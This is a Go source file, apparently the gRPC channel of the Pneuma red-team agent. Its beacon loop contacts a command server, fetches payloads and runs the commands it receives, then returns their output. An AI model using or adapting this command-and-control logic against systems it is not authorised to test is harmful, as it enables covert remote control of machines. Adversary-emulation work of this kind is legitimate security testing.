package sockets

import (
	"context"
	"encoding/json"
	"github.com/preludeorg/pneuma/commands"
	beacon2 "github.com/preludeorg/pneuma/sockets/protos/beacon"
	"github.com/preludeorg/pneuma/util"
	"strings"
	"time"

	"google.golang.org/grpc"
)

type GRPC struct {}

func init() {
	util.CommunicationChannels["grpc"] = GRPC{}
}

func (contact GRPC) Communicate(agent *util.AgentConfig, beacon util.Beacon) util.Beacon {
	for {
		refreshBeacon(agent, &beacon)
		for agent.Contact == "grpc" {
			body := beaconSend(agent.Address, beacon)
			var tempB util.Beacon
			json.Unmarshal(body, &tempB)
			if(len(tempB.Links)) == 0 {
				break
			}
			for _, link := range tempB.Links {
				var payloadPath string
				if len(link.Payload) > 0 {
					payloadPath = requestPayload(link.Payload)
				}
				response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
				link.Response = strings.TrimSpace(response)
				link.Status = status
				link.Pid = pid
				beacon.Links = append(beacon.Links, link)
			}
		}
		if agent.Contact != "grpc" {
			return beacon
		}
		beacon.Links = beacon.Links[:0]
		jitterSleep(agent.Sleep, "GRPC")
	}
}

func beaconSend(address string, beacon util.Beacon) []byte {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
	}
	defer conn.Close()
	c := beacon2.NewBeaconClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	data, _ := json.Marshal(beacon)
	r, err := c.Handle(ctx, &beacon2.BeaconIncoming{Beacon: string(util.Encrypt(data))})
	if err != nil {
		return nil //no instructions for me
	}
	return []byte(util.Decrypt(r.GetBeacon()))
}
